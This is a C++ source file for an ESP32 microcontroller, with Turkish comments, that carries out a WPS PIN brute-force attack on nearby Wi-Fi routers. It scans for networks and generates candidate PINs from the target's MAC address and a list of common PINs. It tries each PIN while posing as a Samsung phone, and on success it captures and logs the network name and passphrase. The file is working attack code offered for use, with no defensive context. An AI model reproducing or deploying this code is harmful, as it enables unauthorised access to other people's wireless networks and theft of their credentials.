#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_wps.h>
#include <esp_event.h>
#include "wps_attack.h"
#include "web_interface.h"
#include "definitions.h"

// ─── Dışa açılan değişkenler ──────────────────────────────────────────────────
wps_target_t wps_targets[WPS_MAX_TARGETS];
int          wps_target_count  = 0;
wps_state_t  wps_attack_state  = WPS_IDLE;
int          wps_attempt       = 0;
int          wps_total         = 0;
char         wps_current_pin[9]  = {0};
char         wps_found_pin[9]    = {0};
char         wps_found_ssid[33]  = {0};
char         wps_found_pass[65]  = {0};

// ─── İç değişkenler ───────────────────────────────────────────────────────────
static int     wps_tgt_idx   = 0;
static volatile int8_t wps_evt_result = 0;  // 0=bekle 1=OK -1=fail

// En sık kullanılan varsayılan WPS PIN'leri (araştırma veritabanından)
static const char *COMMON_PINS[] = {
  "12345670", "00000000", "11111111", "22222222", "33333333",
  "44444444", "55555555", "66666666", "77777777", "88888888",
  "99999999", "12345678", "87654321", "11223344", "44332211",
  "10000000", "20000000", "30000000", "40000000", "50000000",
  "60000000", "70000000", "80000000", "90000000", "01234567",
  "76543210", "11110000", "00001111", "13131313", "31313131",
  "12121212", "21212121", "10101010", "01010101", "11001100",
  "00110011", "12341234", "43214321", "98765432", "23456789",
  "11223300", "00223311", "11001122", "22110011", "12300000",
  "00000012", "12120000", "00001212", "11220000", "00001122",
  nullptr
};
static const int COMMON_PIN_COUNT = 50;

// Sequential brute-force için: 7 rakam + checksum hesabı
// Reaver optimizasyonu olmadan: 10^7 ~ 10M (pratik değil)
// Yalnızca common + vendor pini kullanılır

// ─── WPS Checksum hesabı ─────────────────────────────────────────────────────
static uint8_t wps_checksum(uint32_t pin7) {
  uint32_t acc = 0;
  uint32_t p   = pin7;
  // Rakamlar sağdan sola: d6 d5 d4 d3 d2 d1 d0
  int digits[7];
  for (int i = 6; i >= 0; i--) { digits[i] = p % 10; p /= 10; }
  acc = 3*digits[0] + digits[1] + 3*digits[2] + digits[3]
      + 3*digits[4] + digits[5] + 3*digits[6];
  return (uint8_t)((10 - (acc % 10)) % 10);
}

static void make_pin(uint32_t pin7, char out[9]) {
  uint8_t cs = wps_checksum(pin7);
  snprintf(out, 9, "%07u%u", pin7, cs);
}

// ─── Vendor PIN hesaplama (BSSID'den) ─────────────────────────────────────────
// Kaynaklar: RouterKeygen, Reaver, bilinen üretici algoritmaları
static void vendor_pins(const uint8_t *bssid, char pins[][9], int &count) {
  count = 0;
  uint32_t mac24 = ((uint32_t)bssid[3] << 16)
                 | ((uint32_t)bssid[4] << 8)
                 |  (uint32_t)bssid[5];
  uint32_t mac32 = ((uint32_t)bssid[2] << 24)
                 | ((uint32_t)bssid[3] << 16)
                 | ((uint32_t)bssid[4] << 8)
                 |  (uint32_t)bssid[5];

  // ── Belkin / Arcadyan (MAC son 6 hex → rakam) ──
  // PIN = dec(mac24 % 10000000), checksum
  {
    uint32_t p7 = mac24 % 10000000;
    make_pin(p7, pins[count++]);
  }

  // ── Linksys / Cisco (MAC son 8 hex → ilk 7 rakam) ──
  {
    uint32_t p7 = (mac32 >> 1) % 10000000;
    make_pin(p7, pins[count++]);
  }

  // ── Netgear (MAC XOR tabanlı) ──
  {
    uint32_t x = (bssid[2] ^ bssid[5]) | ((uint32_t)(bssid[3] ^ bssid[4]) << 8);
    uint32_t p7 = (mac24 ^ x) % 10000000;
    make_pin(p7, pins[count++]);
  }

  // ── ARRIS / Motorola (MAC dec mod) ──
  {
    uint64_t m = ((uint64_t)bssid[0] << 40) | ((uint64_t)bssid[1] << 32)
               | ((uint64_t)bssid[2] << 24) | ((uint64_t)bssid[3] << 16)
               | ((uint64_t)bssid[4] << 8)  |  (uint64_t)bssid[5];
    uint32_t p7 = (uint32_t)(m % 10000000);
    make_pin(p7, pins[count++]);
  }

  // ── TP-Link (MAC son 4 bayt → PIN) ──
  {
    uint32_t p7 = ((uint32_t)bssid[4] * 256 + bssid[5]) * 100
                + ((uint32_t)bssid[3] % 100);
    p7 %= 10000000;
    make_pin(p7, pins[count++]);
  }

  // ── Technicolor / Thomson (SSID bazlı, MAC'dan tahmin) ──
  {
    uint32_t p7 = (mac24 * 3) % 10000000;
    make_pin(p7, pins[count++]);
  }
}

// ─── WPS olay işleyici (ESP-IDF event loop) ──────────────────────────────────
static void wps_event_handler(void *arg, esp_event_base_t base,
                               int32_t id, void *data) {
  if (base != WIFI_EVENT) return;
  if (id == WIFI_EVENT_STA_WPS_ER_SUCCESS) {
    // Başarılı — bağlantı bilgilerini al
    wifi_event_sta_wps_er_success_t *e = (wifi_event_sta_wps_er_success_t *)data;
    if (e && e->ap_cred_cnt > 0) {
      strncpy(wps_found_ssid, (char *)e->ap_cred[0].ssid,     32);
      strncpy(wps_found_pass, (char *)e->ap_cred[0].passphrase, 64);
    }
    wps_evt_result = 1;
  } else if (id == WIFI_EVENT_STA_WPS_ER_FAILED ||
             id == WIFI_EVENT_STA_WPS_ER_TIMEOUT) {
    wps_evt_result = -1;
  }
}

static bool handler_registered = false;

static void ensure_handler() {
  if (!handler_registered) {
    esp_event_handler_register(WIFI_EVENT, ESP_EVENT_ANY_ID,
                               &wps_event_handler, nullptr);
    handler_registered = true;
  }
}

// ─── Tek PIN denemesi (blocking, web sunucu içerde) ──────────────────────────
// Döndürür: 1=başarı, -1=başarısız, 0=hata/zaman aşımı
static int8_t wps_try_one(const uint8_t *bssid, int channel, const char *pin) {
  wps_evt_result = 0;
  ensure_handler();

  // Hedef AP'ye bağlantı config'i — WPS bu BSSID'e gidecek
  wifi_config_t sta = {};
  memcpy(sta.sta.bssid, bssid, 6);
  sta.sta.bssid_set = 1;
  sta.sta.channel   = (uint8_t)channel;
  esp_wifi_set_config(WIFI_IF_STA, &sta);

  // WPS PIN yapılandırması
  esp_wps_config_t cfg = WPS_CONFIG_INIT_DEFAULT(WPS_TYPE_PIN);
  strncpy(cfg.factory_info.device_pin, pin, 8);
  cfg.factory_info.device_pin[8] = '\0';
  strcpy(cfg.factory_info.manufacturer, "SAMSUNG");
  strcpy(cfg.factory_info.model_name,   "Galaxy");
  strcpy(cfg.factory_info.device_name,  "SM-G998B");

  if (esp_wifi_wps_enable(&cfg) != ESP_OK)  return 0;
  if (esp_wifi_wps_start(0)     != ESP_OK)  { esp_wifi_wps_disable(); return 0; }

  // Olay gelene veya zaman aşımı dolana kadar bekle; bu sürede web serve et
  unsigned long start = millis();
  while (wps_evt_result == 0 && millis() - start < WPS_PIN_TIMEOUT_MS) {
    web_interface_handle_client();
    delay(40);
  }

  esp_wifi_wps_disable();
  esp_wifi_disconnect();

  if (wps_evt_result == 0) return 0;   // zaman aşımı
  return wps_evt_result;
}

// ─── PIN listesi oluştur ──────────────────────────────────────────────────────
#define MAX_VENDOR_PINS 8
static char all_pins[COMMON_PIN_COUNT + MAX_VENDOR_PINS + 2][9];
static int  all_pin_count = 0;

static void build_pin_list(const uint8_t *bssid) {
  all_pin_count = 0;

  // 1. Vendor PIN'leri (önce dene — daha hızlı tutma)
  char vp[MAX_VENDOR_PINS][9];
  int  vc = 0;
  vendor_pins(bssid, vp, vc);
  for (int i = 0; i < vc && all_pin_count < (int)(sizeof(all_pins)/9); i++)
    memcpy(all_pins[all_pin_count++], vp[i], 9);

  // 2. Common PIN'leri
  for (int i = 0; COMMON_PINS[i] && all_pin_count < (int)(sizeof(all_pins)/9); i++)
    memcpy(all_pins[all_pin_count++], COMMON_PINS[i], 9);

  wps_total = all_pin_count;
}

// ─── Tarama ───────────────────────────────────────────────────────────────────
void wps_scan() {
  wps_attack_state = WPS_SCANNING;
  wps_target_count = 0;

  int n = WiFi.scanNetworks(false, true, false, 150);
  for (int i = 0; i < n && wps_target_count < WPS_MAX_TARGETS; i++) {
    strncpy(wps_targets[wps_target_count].ssid, WiFi.SSID(i).c_str(), 32);
    memcpy(wps_targets[wps_target_count].bssid,  WiFi.BSSID(i), 6);
    wps_targets[wps_target_count].channel = WiFi.channel(i);
    wps_targets[wps_target_count].rssi    = WiFi.RSSI(i);
    wps_target_count++;
  }
  WiFi.scanDelete();
  wps_attack_state = WPS_IDLE;
}

// ─── Saldırıyı başlat ─────────────────────────────────────────────────────────
void wps_start_attack(int target_index) {
  if (target_index < 0 || target_index >= wps_target_count) return;
  wps_tgt_idx     = target_index;
  wps_attempt     = 0;
  wps_evt_result  = 0;
  wps_found_pin[0] = '\0';
  wps_found_ssid[0] = '\0';
  wps_found_pass[0] = '\0';

  build_pin_list(wps_targets[target_index].bssid);

  // APSTA: yönetim AP ayakta kalır, STA WPS için kullanılır
  WiFi.mode(WIFI_MODE_APSTA);
  delay(100);
  esp_wifi_set_max_tx_power(84);
  esp_wifi_set_ps(WIFI_PS_NONE);

  wps_attack_state = WPS_ATTACKING;
  DEBUG_PRINTF("WPS Saldiri: %s, %d PIN\n",
    wps_targets[target_index].ssid, wps_total);
}

// ─── Dur ──────────────────────────────────────────────────────────────────────
void wps_stop() {
  esp_wifi_wps_disable();
  esp_wifi_disconnect();
  wps_attack_state = WPS_STOPPED;
  wps_current_pin[0] = '\0';

  // Yönetim AP'yi geri yükle — WPS sırasında APSTA'ya alınmıştı
  WiFi.mode(WIFI_MODE_AP);
  WiFi.softAP(AP_SSID, AP_PASS);
  delay(100);
  esp_wifi_set_max_tx_power(84);
  esp_wifi_set_ps(WIFI_PS_NONE);

  DEBUG_PRINTLN("WPS durduruldu, yonetim AP geri yuklendi.");
}

// ─── Ana döngü (main loop'tan çağrılır) ──────────────────────────────────────
void wps_loop() {
  if (wps_attack_state != WPS_ATTACKING) return;
  if (wps_attempt >= wps_total) {
    wps_attack_state = WPS_EXHAUSTED;
    // Yönetim AP'yi geri yükle — kullanıcı sonucu görebilsin
    WiFi.mode(WIFI_MODE_AP);
    WiFi.softAP(AP_SSID, AP_PASS);
    delay(100);
    esp_wifi_set_max_tx_power(84);
    esp_wifi_set_ps(WIFI_PS_NONE);
    DEBUG_PRINTLN("WPS: Tum PIN'ler denendi, basari yok.");
    return;
  }

  // Şu anki PIN'i dene
  memcpy(wps_current_pin, all_pins[wps_attempt], 9);
  DEBUG_PRINTF("WPS [%d/%d]: %s\n", wps_attempt + 1, wps_total, wps_current_pin);

  int8_t result = wps_try_one(
    wps_targets[wps_tgt_idx].bssid,
    wps_targets[wps_tgt_idx].channel,
    wps_current_pin);

  if (result == 1) {
    // Başarı! — PIN bulundu
    memcpy(wps_found_pin, wps_current_pin, 8);
    wps_found_pin[8] = '\0';
    wps_attack_state = WPS_SUCCESS;
    led_on();
    DEBUG_PRINTF("WPS BASARILI! PIN: %s, SSID: %s, Pass: %s\n",
      wps_found_pin, wps_found_ssid, wps_found_pass);
    // Yönetim AP'yi geri yükle — kullanıcı sonucu görebilsin
    WiFi.mode(WIFI_MODE_AP);
    WiFi.softAP(AP_SSID, AP_PASS);
    delay(100);
    esp_wifi_set_max_tx_power(84);
    esp_wifi_set_ps(WIFI_PS_NONE);
  } else {
    wps_attempt++;
  }
}

// Ana döngü: tüm PIN'ler denendi
// (bu kontrol wps_loop() başındaki erken dönüş bloğunda yapılır)
